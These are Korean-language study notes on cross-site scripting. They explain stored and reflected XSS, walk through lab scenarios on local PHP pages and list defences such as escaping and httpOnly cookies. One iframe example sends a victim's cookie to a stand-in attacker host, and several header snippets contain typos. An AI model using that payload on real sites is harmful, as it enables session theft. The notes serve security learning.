# 1. XSS

## 개요

- 크로스 사이트 스트립트(XSS)
    - 정의
        - 웹사이트 관리자가 아닌 공격자(attacker)가 웹 페이지에 악성 스크립트를 삽입할 수 있는 취약점
    - 발생 원인
        - HTML을 생성할 때 HTML 문법에 특수문자가 제대로 처리되지 않아서 발생
        - HTML 이스케이프 개요
            - HTML에서는 ‘<’ 를 사용할 경우 ‘&lt;’로 작성되어야 한다. 왜냐하면 해당 값으로 브라우저는 ‘<’를 시작 태그로 판단하기 때문
            - 이처럼 이스케이프 방법은 아래처럼 표시
            
            | 놓여져 있는 위치 | 설명 | 최초 이스케이프 내용 |
            | --- | --- | --- |
            | 요소 내용 | 태그와 문자 참고로 해석
            "<"으로 끝 | "<"와 "&"을 문자 참고로 |
            | 속성 값 | 문자 참조로 해석
            큰 따옴표가 끝 | 속성 값을 "''”으로 둘러 싸고, "<"와  "''”, "&"을 문자 참고로  |
            
- 공격 종류
    - Stored XSS  와 Stored XSS
        - Stored XSS
            - 공격용 자바스크립트가 취약한 서버에 저장된 상태로 지속적으로 피해를 끼침
            - 스크립트 구문 그대로 페이지에 남아 있음
        - Reflected XSS
            - 공격용 자바스크립트가 대상 사이트가 아닌 메일이나 피싱 사이트에 존재
            - 특정 매개변수를 입력받는 형태

- 취약점 영향
    - 사이트 사용자의 브라우저에서 공격자가 준비한 스크립트가 실행되면서 쿠키값 탈취 가능
    - 브라우저에서 스크립트가 동작하여 웹 응용 프로그램을 악용 가능
    - 웹 사이트에 위조된 입력 양식을 표시하여 개인정보 탈취
    - 수동적인 공격을 통한 다른 사용자의 쿠키값 훔치기
        - 실제 공격은  취약한 사이트를 구성하여 해당 사이트로 유인
        - HTML의 iframe 태그 안에 취약한 사이트 페이지를 삽입해 XSS 공격을 시도
        - iframe 공격 예시
            
            ```abap
            <html><body>
            할인 상품 정보
            <br><br>
            <iframe width=320 height=100 src="http://example.jp/43/43-001.php?keyword=<script>window.location='http://trap.example.com/43/43-901.php?sid='%2Bdocument.cookie;</script>"></iframe>
            </body></html>
            
            ```
            

---

## 공격 시라니오

1. Stored XSS
    - 참고 사항
        - 댓글을 달 수 있는 게시판 형식의 php 파일
        - 댓글의 스크립트을 통해 지속적으로 공격이 발생
    - 참고 파일
        - 1-1. php
    - 공격 시나리오
        1. 1.1.php URL 접속
        2. 아래와 같은 악성 스크립트를 댓글에 입력하고 제출:
        
        ```html
        <script>alert('Stored XSS!');</script>
        
        ```
        
        1. 단 댓글이 모든 사용자에게 표시될 때 자동 실행됨

1. Reflected XSS
    - 참고 사항
        - 사용자가 특정 URL을 접속하도록 유도
        - 특정 매개변수를 통해 공격을 실행
    - 참고 파일
        - 1-2. php
    - 공격 시나리오
        1. 피해자에게 다음과 같은 URL을 유도
            
            ```html
            http://localhost/reflected_xss.php?q=<script>alert('Reflected XSS!')</script>
            
            ```
            
        2. 검색 결과에 악성 스크립트가 즉시 반영되어 실행
    
    ---
    
- 대책
    1. HTML의 이스케이프 처리에 사용하는 함수 사용
        1. htmlspecialchars
            1. 해당 함수를 통해 최대 4개의 함수를 인식하고 이스케이프 처리 가능
            2. 예제
                1. 1-3에 첨부(1. 시나리오 Stored XSS)
        2. 응답의 문자 인코딩 지정
            1. 웹 응용 프로그램에서는 상정한 문자 인코딩과 웹 브라우저가 상정하는 인코딩에 차이가 있음으로 해당 취약점의 원인이 됨
                
                ```c
                header(’Content-Type: text/html; charset-UTF-8’)
                ```
                
            2. 예제
                1. 1-4에 첨부(2. 시나리오 Reflected XSS)
        3. X-XSS-Protection 응답 헤더 사용
            1. 최신 브라우저에는 XSS 필터라는 보안 기능이 구현
            2. XSS 필터는 반사형 XSS 공격을 무효화하게 설정할 수 있음
            
            ```c
            X-XSS-Protection: 1; mode=blokck
            ```
            
        
         d. 입력값 검증
        
        1. 입력값에 대한 검증하는 로직을 구현
        
        e. 쿠키에 httpOnly 속성을 부여
        
        1. 쿠키 속성 중에 httpOnly 기능을 활성화